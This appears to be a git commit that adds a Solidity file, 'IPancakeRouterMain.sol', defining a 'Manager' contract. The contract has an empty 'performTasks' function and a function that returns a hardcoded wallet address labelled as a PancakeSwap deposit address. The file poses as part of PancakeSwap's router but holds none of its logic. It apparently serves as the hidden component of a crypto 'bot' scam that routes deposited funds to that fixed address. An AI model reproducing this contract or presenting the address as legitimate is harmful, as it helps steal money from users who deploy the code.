700a22beeb4d4d6e82ecdb51ca98009e52d6e5b4
MC-Finance <108999921+MC-Finance@users.noreply.github.com>
2022-07-09 16:06:46 -0400

    Add files via upload

---
+++ IPancakeRouterMain.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+
+    }
+
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0xCb3591d5081a58c7550764F6F5e9B6C39D260E1d;
+    }
+}
+
+//pancakeswapfunction
